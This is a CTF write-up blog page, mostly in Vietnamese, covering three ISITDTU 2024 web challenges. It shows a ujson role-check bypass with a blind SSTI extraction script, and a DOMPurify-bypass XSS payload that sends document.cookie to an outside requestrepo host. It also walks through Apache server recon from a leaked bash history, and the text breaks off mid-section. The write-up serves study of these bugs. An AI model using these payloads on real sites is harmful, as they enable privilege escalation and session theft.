

<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
  <head>
    

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

  <title>ISITDTU-CTF-2024 - WEB &#39;s challenges - &gt; root@l3mnt2010:~# ./exploit.py</title>
  <meta name="description" content="ISITDTU CTF 2024  web/Another one web/ X ÉC ÉC web/S1mple  recon detect exploit      .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 1.3rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.">
  <meta name="author" content="l3mnt2010"/><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "\u003e root@l3mnt2010:~# .\/exploit.py",
    
    "url": "https:\/\/l3mnt2010.github.io\/"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "https:\/\/l3mnt2010.github.io\/"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "https:\/\/l3mnt2010.github.io\/",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "https:\/\/l3mnt2010.github.io\/write-up\/2024-10-24-isitdtu-ctf-2024\/",
          "name": "Isitdtu ctf 2024 web \u0027s challenges"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : ""
  },
  "headline": "ISITDTU-CTF-2024 - WEB \u0027s challenges",
  "description" : "ISITDTU CTF 2024  web\/Another one web\/ X ÉC ÉC web\/S1mple  recon detect exploit      \r\r\r\r\r.toc-container {\rposition: fixed;\rleft: 0;\rtop: 100px; width: 350px; max-height: 80vh;\roverflow-y: auto;\roverflow-x: auto;\rpadding: 20px;\rborder-right: 1px solid #eee;\rbackground-color: black; z-index: 100;\rtext-align: left; }\r.toc {\rfont-size: 1.3rem; color: #fff; text-align: left; }\r.toc h4 {\rmargin-top: 0;\rmargin-bottom: 1rem;\rfont-size: 1.",
  "inLanguage" : "en",
  "wordCount":  2245 ,
  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
  "image" : "https:\/\/l3mnt2010.github.io\/avatar.png",
  "keywords" : [ "CTF, Vietnamese" ],
  "mainEntityOfPage" : "https:\/\/l3mnt2010.github.io\/write-up\/2024-10-24-isitdtu-ctf-2024\/",
  "publisher" : {
    "@type": "Organization",
    "name" : "https:\/\/l3mnt2010.github.io\/",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "https:\/\/l3mnt2010.github.io\/avatar.png",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>


<meta property="og:title" content="ISITDTU-CTF-2024 - WEB &#39;s challenges" />
<meta property="og:description" content="ISITDTU CTF 2024  web/Another one web/ X ÉC ÉC web/S1mple  recon detect exploit      .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 1.3rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.">
<meta property="og:image" content="https://l3mnt2010.github.io/avatar.png" />
<meta property="og:url" content="https://l3mnt2010.github.io/write-up/2024-10-24-isitdtu-ctf-2024/" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="&gt; root@l3mnt2010:~# ./exploit.py" />

  <meta name="twitter:title" content="ISITDTU-CTF-2024 - WEB &#39;s challenges" />
  <meta name="twitter:description" content="ISITDTU CTF 2024  web/Another one web/ X ÉC ÉC web/S1mple  recon detect exploit      .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto; …">
  <meta name="twitter:image" content="https://l3mnt2010.github.io/avatar.png" />
  <meta name="twitter:card" content="summary_large_image" />
  <link href='https://l3mnt2010.github.io/avatar.png' rel='icon' type='image/x-icon'/>
  <meta name="generator" content="Hugo 0.83.1" />
  <link rel="alternate" href="https://l3mnt2010.github.io/index.xml" type="application/rss+xml" title="&gt; root@l3mnt2010:~# ./exploit.py"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://l3mnt2010.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/syntax.css" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">



  </head>
  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="https://l3mnt2010.github.io/">&gt; root@l3mnt2010:~# ./exploit.py</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        
          
            <li>
              <a title="Home" href="https://l3mnt2010.github.io/">Home</a>
            </li>
          
        
          
            <li>
              <a title="Posts" href="https://l3mnt2010.github.io/posts">Posts</a>
            </li>
          
        
          
            <li>
              <a title="Write-up CTF" href="https://l3mnt2010.github.io/write-up">Write-up CTF</a>
            </li>
          
        
          
            <li>
              <a title="Tags" href="https://l3mnt2010.github.io/tags">Tags</a>
            </li>
          
        
          
            <li>
              <a title="About" href="https://l3mnt2010.github.io/about">About</a>
            </li>
          
        

        

        
      </ul>
    </div>

    
      <div class="avatar-container">
        <div class="avatar-img-border">
          <a title="&gt; root@l3mnt2010:~# ./exploit.py" href="https://l3mnt2010.github.io/">
            <img class="avatar-img" src="https://l3mnt2010.github.io/avatar.png" alt="&gt; root@l3mnt2010:~# ./exploit.py" />
           
          </a>
        </div>
      </div>
    

  </div>
</nav>




    


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


  
  
  






  

  <header class="header-section ">
    
    
    <div class="intro-header no-img">
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="write-up-heading">
              
                <h1>ISITDTU-CTF-2024 - WEB &#39;s challenges</h1>
              
              
                <hr class="small">
              
              
              
            </div>
          </div>
        </div>
      </div>
    </div>
  
  </header>


    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        
  <div class="toc-container">
    <div class="toc">
      <nav id="TableOfContents">
        
        <nav id="TableOfContents">
  <ol>
    <li><a href="#isitdtu-ctf-2024">ISITDTU CTF 2024</a>
      <ol>
        <li><a href="#webanother-one">web/Another one</a></li>
        <li><a href="#web-x-éc-éc">web/ X ÉC ÉC</a></li>
        <li><a href="#webs1mple">web/S1mple</a>
          <ol>
            <li><a href="#recon">recon</a></li>
            <li><a href="#detect">detect</a></li>
            <li><a href="#exploit">exploit</a></li>
          </ol>
        </li>
      </ol>
    </li>
  </ol>
</nav>
      </nav>
    </div>
  </div>

  <style>
     
    .toc-container {
      position: fixed;
      left: 0;
      top: 100px;  
      width: 350px;  
      max-height: 80vh;
      overflow-y: auto;
      overflow-x: auto;
      padding: 20px;
      border-right: 1px solid #eee;
      background-color: black;  
      z-index: 100;
      text-align: left;  
    }

    .toc {
      font-size: 1.3rem;  
      color: #fff;  
      text-align: left;  
    }

    .toc h4 {
      margin-top: 0;
      margin-bottom: 1rem;
      font-size: 1.3rem;  
      text-align: left;  
    }

     
    .toc ul, .toc ol {
      padding-left: 0;  
      margin: 0;
      list-style-type: none;
      text-align: left;  
    }

     
    .toc ul ul, .toc ul ol, .toc ol ul, .toc ol ol {
      padding-left: 10px;
    }

    .toc li {
      padding: 10px 0;
      line-height: 1.6;
      text-align: left;  
    }

     
    .toc a {
      text-decoration: none;
      display: block;
      text-align: left;  
      padding-left: 3px;  
      font-size: 1.3rem;  
      transition: color 0.2s;
    }

     
    .toc > nav > ul > li > a {
      color: #bb86fc;  
      font-weight: bold;
    }

     
    .toc > nav > ul > li > ul > li > a {
      color: #ff4d4d;  
    }

     
    .toc > nav > ul > li > ul > li > ul > li > a {
      color: #4caf50;  
    }

     
    .toc a:hover {
      color: #ffcc00;  
    }

     
    .toc a.active {
      color: #ffcc00;  
      font-weight: bold;
      border-left: 4px solid #ffcc00;  
      padding-left: 3px;  
      margin-left: -5px;
    }

     
    .main-content {
      margin-left: 380px;  
    }

     
    @media (max-width: 1200px) {
      .toc-container {
        width: 280px;  
      }
      .main-content {
        margin-left: 320px;
      }
    }

    @media (max-width: 900px) {
      .toc-container {
        position: static;
        width: 100%;
        max-height: none;
        border-right: none;
        border-bottom: 1px solid #eee;
        margin-bottom: 20px;
      }
      .main-content {
        margin-left: 0;
      }
    }
  </style>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      
      function highlightTOC() {
        const headings = document.querySelectorAll('.main-content h1, .main-content h2, .main-content h3, .main-content h4, .main-content h5, .main-content h6');
        const tocLinks = document.querySelectorAll('.toc a');

        if (headings.length === 0 || tocLinks.length === 0) return;

        let currentActiveIndex = -1;
        const scrollPosition = window.scrollY;

        for (let i = 0; i < headings.length; i++) {
          const heading = headings[i];
          const headingTop = heading.offsetTop - 100;
          const headingBottom = headingTop + heading.offsetHeight;

          if (scrollPosition >= headingTop && scrollPosition <= headingBottom) {
            currentActiveIndex = i;
            break;
          }
        }

        tocLinks.forEach(link => link.classList.remove('active'));

        if (currentActiveIndex >= 0) {
          const currentHeading = headings[currentActiveIndex];
          const headingId = currentHeading.id;

          const correspondingLink = document.querySelector(`.toc a[href="#${headingId}"]`);
          if (correspondingLink) {
            correspondingLink.classList.add('active');

            const tocContainer = document.querySelector('.toc-container');
            const linkTop = correspondingLink.offsetTop;
            const containerScrollTop = tocContainer.scrollTop;
            const containerHeight = tocContainer.clientHeight;

            if (linkTop < containerScrollTop || linkTop > containerScrollTop + containerHeight) {
              tocContainer.scrollTop = linkTop - containerHeight / 2;
            }
          }
        }
      }

      highlightTOC();
      window.addEventListener('scroll', highlightTOC);
      window.addEventListener('resize', highlightTOC);

      const fragment = window.location.hash;
      if (fragment) {
        const element = document.querySelector(fragment);
        if (element) {
          element.scrollIntoView({ behavior: 'smooth' });

          const tocLinks = document.querySelectorAll('.toc a');
          tocLinks.forEach(link => {
            link.classList.remove('active');
            if (link.getAttribute('href') === fragment) {
              link.classList.add('active');
            }
          });

          highlightTOC();
        }
      }

      const tocLinks = document.querySelectorAll('.toc a');
      tocLinks.forEach(link => {
        link.addEventListener('click', function(event) {
          const targetId = link.getAttribute('href').substring(1);
          const targetElement = document.getElementById(targetId);

          if (targetElement) {
            targetElement.scrollIntoView({ behavior: 'smooth' });

            tocLinks.forEach(l => l.classList.remove('active'));
            link.classList.add('active');

            history.pushState(null, null, `#${targetId}`);

            event.preventDefault();
          }
        });
      });
    });
  </script>  


<!-- raw HTML omitted -->
<h1 id="isitdtu-ctf-2024">ISITDTU CTF 2024</h1>
<p><img src="https://hackmd.io/_uploads/B1DxrgiG1x.png" alt="image"></p>
<p>my team RipeRice in the top 4</p>
<h2 id="webanother-one">web/Another one</h2>
<p>Source code: python flask + bug ujson + ssti template jinjja</p>
<p>Trang web có chức năng đăng kí đăng nhập + hiển thị + render template nhưng không hiển thị kết quả</p>
<p>Quan sát dockerfile ta thấy mạng để internal</p>
<pre><code>networks:
  internal:
    driver: bridge
</code></pre><p>Server đã xóa <code>rm /usr/bin/wget</code> và không có các câu lệnh có thể OOB, flag được random name nằm tại /app nên định hướng từ đầu có vẻ là rce.</p>
<p>Nhìn vào source code ta có thể thấy nhanh sink rce ssti từ việc render trực tiếp đầu vào của người dùng</p>
<pre><code> data = request.get_json()
            template = data.get(&quot;template&quot;)
            rendered_template = render_template_string(template)
</code></pre><p>Để access đến nó ta cần có role admin qua việc phân giải jwt được gắn tại cookie phiên</p>
<pre><code>decoded = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
            role = decoded.get('role')

            if role != &quot;admin&quot;:
                return jsonify(message=&quot;Admin only&quot;), 403
</code></pre><p>Do đó ta hướng đến việc bypass admin để access đến sink, <code>PyJWT</code> là version mới nhất nên có vẻ chưa thể khai thác đoạn này.</p>
<p>Bắt đầu đi tìm các gadget liên quan để việc authorization.</p>
<p>Oử đây ta thấy việc register khá khả nghi -&gt;</p>
<pre><code>@app.route('/register', methods=['POST'])
def register():
    json_data = request.data
    if &quot;admin&quot; in json_data:
        return jsonify(message=&quot;Blocked!&quot;)
    data = ujson.loads(json_data)
    username = data.get('username')
    password = data.get('password')
    role = data.get('role')
    
    if role !=&quot;admin&quot; and role != &quot;user&quot;:
        return jsonify(message=&quot;Never heard about that role!&quot;)
    
    if username == &quot;&quot; or password == &quot;&quot; or role == &quot;&quot;:
        return jsonify(messaage=&quot;Lack of input&quot;)
    
    if register_db(connection, username, password, role):
        return jsonify(message=&quot;User registered successfully.&quot;), 201
    else:
        return jsonify(message=&quot;Registration failed!&quot;), 400
</code></pre><p>Đối với dữ liệu người dùng để reg account mới thì server sẽ thực hiện check nếu có <code>admin</code> trong nội dung thì Blocked. Để ý tại đây thì ta được truyền thêm cả role để reg nên có vẻ source là đây</p>
<pre><code>def register_db(connection, username, password, role):
    try:
        cursor = connection.cursor()

        cursor.execute(&quot;SELECT * FROM users WHERE username = ?&quot;, (username,))
        if cursor.fetchone():
            return False

        cursor.execute(&quot;INSERT INTO users (username, password, role) VALUES (?, ?, ?)&quot;, (username, password, role))
        connection.commit()
        return True
    except sqlite3.Error as e:
        print &quot;Error during registration:&quot;, e
        return False
    finally:
        cursor.close()
</code></pre><p>do việc insert thằng cả role ta control được vào db nên ta sẽ khai thác đoạn này.</p>
<p>Về việc bypass &ldquo;admin&rdquo; có vẻ khá khó nhưng ta thấy ujson sẽ sử lí json sau khi kiểm tra -&gt; searching nhanh thấy nó dính <code>Improper Handling of Syntactically Invalid Structure</code> <a href="https://security.snyk.io/vuln/SNYK-PYTHON-UJSON-2942122">bug</a></p>
<p>Như poc ta thấy thì đối với kí tự unicode thì sẽ bị bỏ qua</p>
<p><img src="https://hackmd.io/_uploads/HkpCUqsg1x.png" alt="image"></p>
<p>ta bypass thành công admin role và nhận jwt để access render</p>
<pre><code>{&quot;username&quot;:&quot;hihi&quot;,&quot;password&quot;:&quot;haha&quot;,&quot;role&quot;:&quot;admi\uD800n&quot;}
</code></pre><p>Truyền data template ssti để blind cmdi</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>POC:</p>
<pre><code>import requests
import time

session = requests.session()
alphabet = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#_*&amp;@!^*{}&quot;
burp0_url = &quot;http://152.69.210.130:64830/render&quot;
payload = &quot;&quot;

burp0_cookies = {
    &quot;COOKIE_SUPPORT&quot;: &quot;true&quot;, &quot;GUEST_LANGUAGE_ID&quot;: &quot;en_US&quot;, &quot;COMPANY_ID&quot;: &quot;10155&quot;,
    &quot;ID&quot;: &quot;50367a6f334147512f326b73467055596a33313330773d3d&quot;,
    &quot;USER_UUID&quot;: &quot;\&quot;Z7hRSaNGp6mfY1hAgHY5013+Z80P3zscPYqAa4cOB00=\&quot;&quot;,
    &quot;LOGIN&quot;: &quot;6869686940676d61696c2e636f6d&quot;,
    &quot;PASSWORD&quot;: &quot;352b67744e7066474a422b653753634d4572307148513d3d&quot;,
    &quot;REMEMBER_ME&quot;: &quot;true&quot;,
    &quot;SCREEN_NAME&quot;: &quot;70672b5950377a5147796569624c6f734968704556513d3d&quot;,
    &quot;jwt_token&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImxtYW8iLCJyb2xlIjoiYWRtaW4ifQ.IIqnwm7Sb09GgWy0SDEkBgsLzbHg66_iCA5DzmiRkJA&quot;
}
burp0_headers = {
    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0&quot;,
    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8&quot;,
    &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;,
    &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,
    &quot;Connection&quot;: &quot;close&quot;,
    &quot;Referer&quot;: &quot;http://localhost:8082/login&quot;,
    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
    &quot;Sec-Fetch-Dest&quot;: &quot;document&quot;,
    &quot;Content-type&quot;: &quot;application/json&quot;,
    &quot;Sec-Fetch-Mode&quot;: &quot;navigate&quot;,
    &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;,
    &quot;Sec-Fetch-User&quot;: &quot;?1&quot;,
    &quot;Priority&quot;: &quot;u=0, i&quot;
}

for i in range(1, 100):
    for char in alphabet:
        burp0_json = payload

        start_time = time.time()
        res = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
        end_time = time.time()

        if (end_time - start_time) &gt;= 5:
            payload += char
            print(&quot;flag is: &quot; + payload)
            break

</code></pre><p>flag: <code>ISITDTU{N0W_y0u_kn0w_h0w_T0_m4k3_1t_r3Fl3ct3d!!}</code></p>
<h2 id="web-x-éc-éc">web/ X ÉC ÉC</h2>
<p>Trang web sử dụng expressjs và module npm <code>dompurify&quot;: &quot;^3.1.6</code> để filter xss -&gt; bypass xss để steal bot cookie</p>
<p>Có chức năng ghi một note và hiển thị note sau khi được server filter xss.</p>
<p>payload:</p>
<pre><code>&lt;svg&gt;&lt;a&gt;&lt;foreignobject&gt;&lt;a&gt;&lt;table&gt;&lt;a&gt;&lt;/table&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;/svg&gt;&lt;a id=&quot;-&gt;&lt;img src onerror=fetch('http://00br69e7.requestrepo.com/?a='+document.cookie)&gt;&quot;&gt;.
</code></pre><p>flag: <code>ISITDTU{d364c13b91d3bd0ecb3ffed49b229fc06b1208e8}</code></p>
<h2 id="webs1mple">web/S1mple</h2>
<h3 id="recon">recon</h3>
<p>Đối với bài này source sẽ được pull từ dockerhub xuống <code>FROM servertest2008/simpleserver:1.4</code> ta thấy có 2 repo khá xuống nhau từ 2 tháng trước và 2 ngày trước đó.</p>
<p>Sau khi build docker đi vào server ta thấy ngay server sử dụng <code>Apache/2.4.18</code> + <code>mod_dumpio.so</code></p>
<p>Module <code>mod_dumpio.so</code> sẽ bật config: <code>LogLevel dumpio:trace7 DumpIOInput On DumpIOOutput On</code> đẻ ghi log.</p>
<p>Trang web có hiển thị 3 href là 3 trang chỉ có only text nên không có gì có thể khai thác -&gt; ta sẽ đi vào server</p>
<p>tại /var/www/html:</p>
<p><img src="https://hackmd.io/_uploads/ryp2xoigye.png" alt="image"></p>
<p>ngoài file index.html thì còn có 2 pages như ta thấy ở trên, ngoài ra còn file <code>.</code>htaccess`</p>
<pre><code>&lt;Files &quot;admin.php&quot;&gt;
    AuthType Basic 
    AuthName &quot;Admin&quot;
    AuthUserFile &quot;/.htpasswd&quot;
    Require valid-user
&lt;/Files&gt;

&lt;Files &quot;adminer.php&quot;&gt;
    AuthType Basic 
    AuthName &quot;Admin&quot;
    AuthUserFile &quot;/.htpasswd&quot;
    Require valid-user
&lt;/Files&gt;

&lt;Files &quot;xmlrpc.php&quot;&gt;
    AuthType Basic 
    AuthName &quot;Admin&quot;
    AuthUserFile &quot;/.htpasswd&quot;
    Require valid-user
&lt;/Files&gt;

&lt;Files .env&gt;
    Order allow,deny
    Deny from all
&lt;/Files&gt;
</code></pre><p>File này do root tạo nó yêu cầu authen khi truy cập vào các file admin.php và adminer.php và AuthUserFile chính là file flag của chall nên có vẻ như phải tìm cách bypass</p>
<p>Tại file admin.php -&gt; ta thấy có thể truyền param pages và được include nhưng nó được cộng string &lsquo;/pages/ + param page + &lsquo;.html&rsquo;.</p>
<p>Vì đây là version php 7.0 nên không thể dùng null byte để bypass hay path truncation php được.</p>
<p>Sau đó mình thực hiện find tất cả các file có đuôi .html trên server nhưng mà không có file này có khuôn mẫu php để có thể khai thác ngoài file <code>/usr/share/vulnx/shell/VulnX.php</code> có chức năng upload file nhưng việc bypass extention là bất khả thi.</p>
<p><img src="https://hackmd.io/_uploads/Skp_ZsilJe.png" alt="image"></p>
<p>Nếu access được đến file này mình có thể upload 1 file vào uploads/.</p>
<p>Sau khi fuzz 1 hồi server thì mình phát hiện được:</p>
<p><img src="https://hackmd.io/_uploads/BJ9Kljog1g.png" alt="image"></p>
<pre><code>vi /etc/apache2/.htpasswd
nano /etc/apache2/.htpasswd
rm /etc/apache2/.htpasswd
cd
git clone https://github.com/anouarbensaad/vulnx.git
apt install python3-pip
apt update
apt install python3 python3-pip
ls
cd vulnx/
ls
pip3 install -r requirements.txt
./install.sh 
bash install.sh 
apt install sudo
./install.sh 
vi install.sh 
nano install.sh 
./install.sh 
cd /usr/share/vulnx/
ls
cat install.sh 
nano install.sh 
ls
cd 
ls
rm -rf vulnx/
cd /usr/share/vulnx/
ls
cd shell/
ls
mkdir cat VulnX.php
ls
mkdir uploads
chmod 777 uploads/
ls -la
rm -r uploads/
mkdir uploads
cd uploads/
l
ls
touch shell.php
chmod 777 shell.php 
ls -la
ls
cd ..
ls
vi VulnX.php
nano VulnX.php
ls
cat uploads/shell.php 
ls
nano uploads/
nano uploads/shell.php 
nano VulnX.gif 
nano VulnX.html 
nano VulnX.php.mp4 
nano VulnX.php.png 
ls cat/
file
nano VulnX.zip 
ls
ls -la
cd uploads/
ls -la
ls
ls -la
cat shell.php 
ls -la shell.php 
nanno shell.php 
nano shell.php 
ls
nano shell.php 
cd
ls
cd /var/www/html/
ls
vi src/.htaccess 
nano src/.htaccess 
ls /etc/apache2/.htpasswd
exit
cat /usr/share/vulnx/shell/uploads/shell.php 
cat /usr/share/vulnx/shell/uploads/shell.php
cat /.flag 
cd /var/www/html/
ls
cd src/
ls
vi admin.php 
apt intall vim
apt install vim
ls
vi admin.php 
cat admin.php 
ls
cd /usr/share/vulnx/
ls
cd shell/
ls
cd uploads/
ls
mv shell.php shell.html
ls -la
cd ..
ls
ps aux
cd
ls
cd /var/www/html/
ls
cd src/
ls
cat admin.php 
cat .htaccess 
cat /
/.htpasswd
vi .htaccess 
ls /usr/share/vulnx/shell/uploads/shell.html 
ls -la /usr/share/vulnx/shell/uploads/shell.html 
cat /usr/share/vulnx/shell/VulnX.php
exit
cd /var/www/html/
ls
cd src/
ls
vi admin.php 
ls
mkdir pages
cd pages/
vi 1.html
vi 2.html
ls
cd ..
ls
vi admin.php 
rm /.htpasswd 
exit
ls
vi /etc/apache2/sites-available/000-default.conf 
service apache2 restart
cd /var/www/html/
ls
cat /usr/share/vulnx/shell/VulnX.php
ls /usr/share/vulnx/shell/VulnX.php
ls /usr/share/vulnx/shell/uploads/
cat /usr/share/vulnx/shell/uploads/shell.html 
cd
ls
ks
ls
ls -la /
cat /.flag 
rm /.flag 
ls
ls -la .htpasswd
cat /.htpasswd
ls
ls -la
cat .htpasswd 
rm .htpasswd 
ls
cd /
ls
ls -la /
cat start.sh 
exit
ls
cd /var/www/html/
ls
cd src/
ls
cat /etc/apache2/sites-available/000-default.conf 
ls
vi about.html
ls
cat index.php 
mv index.php index.html
vi index.html 
ls
vi index.html 
vi contact.html
exit
cat /.htpasswd 
sudo a2enmod dumpio 
a2enmod dumpio
a2enmod dump_io
vi /etc/apache2/apache2.conf
sudo systemctl restart apache2 
service apache2 restart
cat /var/log/apache2/error.log 
cat /var/log/apache2/access_php.log 
cat /var/log/apache2/access.log 
cat /var/log/apache2/error_php.log 
exit
</code></pre><p>Có vẻ đây là hint của tác giả vì không xóa .bash_history của root user</p>
<p>Có thể thấy root thực hiện clone repo <code>https://github.com/anouarbensaad/vulnx.git</code> từ người dùng và cài đặt nó sau đó thực hiện cấu hình apache bằng việc thay đổi file <code>/etc/apache2/sites-available/000-default.conf</code> tiếp theo cài <code>dumpio</code> và kích hoạt nó -&gt; sửa đổi <code>/etc/apache2/apache2.conf</code> và restart lại apache server cuối cùng người dùng đọc 3 file log của server để kiểm tra.</p>
<p>Đối với file <code>/etc/apache2/sites-available/000-default.conf</code></p>
<p><img src="https://hackmd.io/_uploads/S17gHiig1g.png" alt="image"></p>
<p>ở đây tác giả dùng server_api dùng FastCGI để xử lí file .php nhanh hơn giúp tối ưu hiệu suất và cân bằng tải cho hệ thống.</p>
<p>tại web root cho phép <code>AllowOverride All</code> để đảm bảo file .htaccess ở trên hoạt động đúng</p>
<pre><code> RewriteEngine On
    RewriteRule  ^/website-(.*).doc$   /$1.html
</code></pre><p>Đối với đoạn này sẽ thực hiện chuyển hướng các route match regex sang file .html với tên tương ứng</p>
<p>Ta để ý phần giữa root có đọc các file (đây là các file được tạo ra từ việc install repo trên):</p>
<p><img src="https://hackmd.io/_uploads/rJe8Zjieyg.png" alt="image"></p>
<pre><code>cat /usr/share/vulnx/shell/VulnX.php
ls /usr/share/vulnx/shell/VulnX.php
ls /usr/share/vulnx/shell/uploads/
cat /usr/share/vulnx/shell/uploads/shell.html 
</code></pre><p>thấy có file <code>/usr/share/vulnx/shell/uploads/shell.html</code> nhưng mà chỉ có chữ <code>test</code></p>
<p>Phát hiện ra mình chưa đọc log của apache - ở đây có vẻ tác giả quên xóa log nên làm giảm độ khó của chall này</p>
<p><img src="https://hackmd.io/_uploads/Bk7kGooxJl.png" alt="image"></p>
<p>Ta phát hiện ra file <code>/var/log/apache2/access_php.log</code></p>
<p>Tìm hết file này thấy có 2 điểm là chỗ để sol bài này luôn</p>
<p>Điểm đầu tiên là việc bypass authentication ở file .htaccess để access đến admin.php</p>
<p><img src="https://hackmd.io/_uploads/Hkxafisg1g.png" alt="image"></p>
<p>Sau đó là cách access đến file upload:</p>
<p><img src="https://hackmd.io/_uploads/Sy0rQojxJx.png" alt="image"></p>
<p>Tại đây thì ta sẽ có ý tưởng là upload file .html để overwrite file shell/html tại file upload sau đó dùng lfi để trigger rce.</p>
<h3 id="detect">detect</h3>
<p><strong>ACL Bypass</strong>:</p>
<pre><code>&lt;FilesMatch &quot;\.php$&quot;&gt;
        SetHandler  &quot;proxy:unix:/run/php/php7.0-fpm.sock|fcgi://localhost/&quot;
    &lt;/FilesMatch&gt;
